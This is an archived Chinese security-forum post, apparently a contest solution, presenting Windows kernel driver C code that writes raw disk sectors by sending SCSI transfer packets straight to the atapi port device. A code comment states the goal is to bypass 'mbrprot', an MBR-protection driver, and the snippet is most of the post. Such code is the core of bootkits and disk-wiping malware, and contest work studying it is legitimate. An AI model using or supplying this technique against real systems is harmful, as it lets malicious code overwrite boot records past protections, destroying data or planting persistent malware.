

# 大牛们都发代码了，我也来凑凑热闹吧 - 第一题

> 原文：[`www.pediy.com/kssd/pediy10/79030.html`](https://www.pediy.com/kssd/pediy10/79030.html)

大牛们都发代码了，我也来凑凑热闹吧~  
3，4，5 题没什么意思了，发下第一题的关键部分吧~   
思路比较常规，向 atapi 发 srb，但是过不了所谓的第二层保护。其实最早的时候是准备还原改过的 DeviceObject 的，代码很简单，后来以为这样做不符合题意，就换了这个复杂的代码...没想到简单的代码反而更有效，呵呵~  

代码:

```
NTSTATUS
DiWriteDisk(IN ULONG StartSector,
  IN PVOID Buffer,
  IN ULONG Length)
{
  NTSTATUS status;
  UNICODE\_STRING DriverName;
  PDRIVER\_OBJECT DriverObject;
  PDEVICE\_OBJECT Fdo;
  PDEVICE\_OBJECT nextDevObj;
  PDEVICE\_OBJECT final;
  PCOMMON\_DEVICE\_EXTENSION commonExtension;
  PIO\_STACK\_LOCATION nextSp;
  PTRANSFER\_PACKET pkt;
  LARGE\_INTEGER startLoc;
  PUCHAR bufPtr;
  KEVENT event;
  PMDL Mdl;

  //
  // Open the device object to receive the IRP
  //

  RtlInitUnicodeString(&DriverName, DISK);

  status = ObReferenceObjectByName(&DriverName,
                    OBJ\_CASE\_INSENSITIVE,
                    NULL,
                    0,
                    \*IoDriverObjectType,
                    KernelMode,
                    NULL,
                    &DriverObject);

  if (!NT\_SUCCESS(status))
    return status;

  status = DiGetPhysicsDevice(&Fdo, DriverObject);
  if (!NT\_SUCCESS(status))
  {
    ObDereferenceObject(DriverObject);
    return status;
  }

  //
  // Lock the buffer
  //

  Mdl = IoAllocateMdl(Buffer, Length, FALSE, TRUE, NULL);
  if (Mdl == NULL) 
  {
    ObDereferenceObject(DriverObject);
    return STATUS\_INSUFFICIENT\_RESOURCES;
  }
  MmProbeAndLockPages(Mdl, KernelMode, IoReadAccess);
  bufPtr = MmGetMdlVirtualAddress(Mdl);

  //
  // Allocate PKT and initize it
  //

  pkt = ClassPnp\_DequeueFreeTransferPacket(Fdo, TRUE);
  if (NULL == pkt)
  {
    ObDereferenceObject(DriverObject);
    MmUnlockPages(Mdl);
    return STATUS\_INSUFFICIENT\_RESOURCES;
  }
  startLoc.QuadPart = StartSector \* 512;
  Mine\_SetupReadWriteTransferPacket(pkt,
                    bufPtr,
                    Length,
                    startLoc,
                    IRP\_MJ\_WRITE,
                    IRP\_NOCACHE | IRP\_WRITE\_OPERATION | IRP\_DEFER\_IO\_COMPLETION,
                    SL\_OVERRIDE\_VERIFY\_VOLUME);

  //
  // Initize some fields in our pkt
  //

  commonExtension = pkt->Fdo->DeviceExtension;
  nextDevObj = commonExtension->LowerDeviceObject;

  IoReuseIrp(pkt->Irp, STATUS\_NOT\_SUPPORTED);
  nextSp = IoGetNextIrpStackLocation(pkt->Irp);
  nextSp->MajorFunction = IRP\_MJ\_SCSI;
  nextSp->Parameters.Scsi.Srb = &pkt->Srb;
  pkt->Srb.ScsiStatus = pkt->Srb.SrbStatus = 0;
  pkt->Srb.SenseInfoBufferLength = sizeof(SENSE\_DATA);
  pkt->Irp->MdlAddress = Mdl;

  //
  // Prepare our complete event
  //

  KeInitializeEvent(&event, SynchronizationEvent, FALSE);
  IoSetCompletionRoutine(pkt->Irp, DiWriteIoCompletion, &event, TRUE, TRUE, TRUE);

  //
  // Send our TransferPacket directly down, bypass mbrprot
  //

  status = DiGetPortDevice(&final, nextDevObj);
  if (!NT\_SUCCESS(status))
    goto Cleanup;
  status = IoCallDriver(final, pkt->Irp);

  if (STATUS\_PENDING == status)
    KeWaitForSingleObject(&event, Executive, KernelMode, TRUE, NULL);

  status = pkt->Irp->IoStatus.Status;

Cleanup:
  MmUnlockPages(Mdl);
  IoFreeMdl(Mdl);
  ObDereferenceObject(DriverObject);
  return status;
}

```

嗯~好的~这里~

上传的附件
| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || Problem01.rar  
 |